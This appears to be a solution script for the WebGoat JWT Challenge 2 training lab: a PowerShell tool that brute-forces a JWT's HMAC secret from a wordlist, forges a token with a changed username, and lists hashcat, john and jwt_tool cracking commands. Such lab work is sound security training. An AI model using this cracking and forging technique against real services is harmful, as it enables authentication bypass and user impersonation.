# JWT Challenge 2: Secret Cracker and Token Generator
# Cracks the JWT secret and creates new token with username "WebGoat"

$originalToken = "eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTc2NTY5NzEzMCwiZXhwIjoxNzY1Njk3MTkwLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.uysiK5my0-TITQRNe7kE2qjXXKytMC1TrMiwVIBOj_E"

Write-Host "================================================" -ForegroundColor Cyan
Write-Host "   JWT Challenge 2: Secret Cracker" -ForegroundColor Cyan
Write-Host "   WebGoat Token Builder" -ForegroundColor Cyan
Write-Host "================================================`n" -ForegroundColor Cyan

# Base64 URL decode function
function ConvertFrom-Base64Url {
    param([string]$base64Url)
    $base64 = $base64Url.Replace('-', '+').Replace('_', '/')
    while ($base64.Length % 4) { $base64 += '=' }
    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64))
}

# Base64 URL encode function
function ConvertTo-Base64Url {
    param([string]$text)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
    $base64 = [Convert]::ToBase64String($bytes)
    return $base64.Replace('+', '-').Replace('/', '_').Replace('=', '')
}

# HMAC-SHA256 signing function
function New-JwtSignature {
    param(
        [string]$header,
        [string]$payload,
        [string]$secret
    )
    
    $data = "$header.$payload"
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($secret)
    $signature = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($data))
    return [Convert]::ToBase64String($signature).Replace('+', '-').Replace('/', '_').Replace('=', '')
}

# Verify JWT signature
function Test-JwtSignature {
    param(
        [string]$token,
        [string]$secret
    )
    
    $parts = $token.Split('.')
    if ($parts.Count -ne 3) { return $false }
    
    $expectedSig = New-JwtSignature -header $parts[0] -payload $parts[1] -secret $secret
    return $expectedSig -eq $parts[2]
}

# Decode token
Write-Host "Decoding original token..." -ForegroundColor Yellow
$parts = $originalToken.Split('.')
$headerJson = ConvertFrom-Base64Url $parts[0]
$payloadJson = ConvertFrom-Base64Url $parts[1]

Write-Host "`nOriginal Token Details:" -ForegroundColor Green
Write-Host "Header: $headerJson" -ForegroundColor White
Write-Host "Payload: $payloadJson" -ForegroundColor White
Write-Host "`nSignature: $($parts[2].Substring(0, 20))..." -ForegroundColor White

# WebGoat-specific secrets (most likely)
$webgoatSecrets = @(
    "victory",
    "defeating",
    "shipping",
    "deletingTom",
    "WebGoat",
    "webgoat",
    "WEBGOAT",
    "tokenbuilder",
    "builder",
    "WebGoatTokenBuilder",
    "password",
    "secret",
    "123456",
    "admin",
    "test",
    "jwt",
    "token",
    "webgoat123",
    "WebGoat123",
    "password123",
    "secret123"
)

# Common additional secrets
$commonSecrets = @(
    "qwerty",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
    "master",
    "sunshine",
    "princess",
    "football",
    "shadow",
    "michael",
    "jennifer"
)

$allSecrets = $webgoatSecrets + $commonSecrets

Write-Host "`n================================================" -ForegroundColor Cyan
Write-Host "   Brute Forcing Secret Key..." -ForegroundColor Cyan
Write-Host "   Testing $($allSecrets.Count) secrets" -ForegroundColor Cyan
Write-Host "================================================`n" -ForegroundColor Cyan

$foundSecret = $null
$counter = 0

foreach ($secret in $allSecrets) {
    $counter++
    Write-Host "Testing [$counter/$($allSecrets.Count)]: $secret" -NoNewline
    
    if (Test-JwtSignature -token $originalToken -secret $secret) {
        Write-Host " ✓ MATCH!" -ForegroundColor Green
        $foundSecret = $secret
        break
    }
    else {
        Write-Host "" -ForegroundColor Gray
    }
}

if ($foundSecret) {
    Write-Host "`n================================================" -ForegroundColor Green
    Write-Host "   ✅ SECRET FOUND!" -ForegroundColor Green
    Write-Host "================================================" -ForegroundColor Green
    Write-Host "`nSecret Key: $foundSecret" -ForegroundColor Yellow -BackgroundColor DarkGreen
    
    # Create new token with username "WebGoat"
    Write-Host "`n================================================" -ForegroundColor Cyan
    Write-Host "   Creating New Token..." -ForegroundColor Cyan
    Write-Host "================================================`n" -ForegroundColor Cyan
    
    # Parse payload and modify username
    $payload = $payloadJson | ConvertFrom-Json
    $payload.username = "WebGoat"
    
    # Create new payload JSON
    $newPayloadJson = $payload | ConvertTo-Json -Compress
    
    Write-Host "New Payload:" -ForegroundColor Green
    Write-Host ($payload | ConvertTo-Json) -ForegroundColor White
    
    # Encode new payload
    $newPayloadEncoded = ConvertTo-Base64Url -text $newPayloadJson
    
    # Sign with found secret
    $newSignature = New-JwtSignature -header $parts[0] -payload $newPayloadEncoded -secret $foundSecret
    
    # Create new token
    $newToken = "$($parts[0]).$newPayloadEncoded.$newSignature"
    
    Write-Host "`n================================================" -ForegroundColor Green
    Write-Host "   ✅ NEW TOKEN CREATED!" -ForegroundColor Green
    Write-Host "================================================`n" -ForegroundColor Green
    
    Write-Host "New JWT Token (username changed to WebGoat):" -ForegroundColor Yellow
    Write-Host $newToken -ForegroundColor Cyan
    
    # Copy to clipboard
    $newToken | Set-Clipboard
    Write-Host "`n✅ Token copied to clipboard!" -ForegroundColor Green
    
    Write-Host "`n================================================" -ForegroundColor Cyan
    Write-Host "   SUBMIT TO WEBGOAT" -ForegroundColor Cyan
    Write-Host "================================================" -ForegroundColor Cyan
    Write-Host "`n1. Go to WebGoat JWT Challenge 2 page" -ForegroundColor White
    Write-Host "2. Paste the token in the submission field" -ForegroundColor White
    Write-Host "3. Click Submit" -ForegroundColor White
    Write-Host "4. ✅ Challenge Complete!" -ForegroundColor Green
    
    # Verify new token
    Write-Host "`n================================================" -ForegroundColor Yellow
    Write-Host "   VERIFICATION" -ForegroundColor Yellow
    Write-Host "================================================" -ForegroundColor Yellow
    
    if (Test-JwtSignature -token $newToken -secret $foundSecret) {
        Write-Host "✅ New token signature is VALID" -ForegroundColor Green
    }
    else {
        Write-Host "❌ Warning: New token signature verification failed" -ForegroundColor Red
    }
    
    # Decode and show new token
    $newParts = $newToken.Split('.')
    $newPayloadDecoded = ConvertFrom-Base64Url $newParts[1]
    Write-Host "`nNew Token Payload (decoded):" -ForegroundColor Yellow
    Write-Host $newPayloadDecoded -ForegroundColor White
    
}
else {
    Write-Host "`n================================================" -ForegroundColor Red
    Write-Host "   ❌ SECRET NOT FOUND" -ForegroundColor Red
    Write-Host "================================================" -ForegroundColor Red
    Write-Host "`nThe secret is not in the built-in wordlist." -ForegroundColor Yellow
    Write-Host "`nTRY THESE OPTIONS:" -ForegroundColor Cyan
    Write-Host "1. Use jwt_tool with larger wordlist:" -ForegroundColor White
    Write-Host "   python jwt_tool.py TOKEN -C -d rockyou.txt" -ForegroundColor Gray
    Write-Host "`n2. Use hashcat:" -ForegroundColor White
    Write-Host "   hashcat -a 0 -m 16500 jwt.txt rockyou.txt" -ForegroundColor Gray
    Write-Host "`n3. Use john the ripper:" -ForegroundColor White
    Write-Host "   john jwt.txt --wordlist=rockyou.txt" -ForegroundColor Gray
    Write-Host "`n4. Try online JWT cracker:" -ForegroundColor White
    Write-Host "   https://jwt.io (manual secret testing)" -ForegroundColor Gray
    Write-Host "`n5. Add custom secret to this script and run again" -ForegroundColor White
}

Write-Host "`n================================================`n" -ForegroundColor Cyan
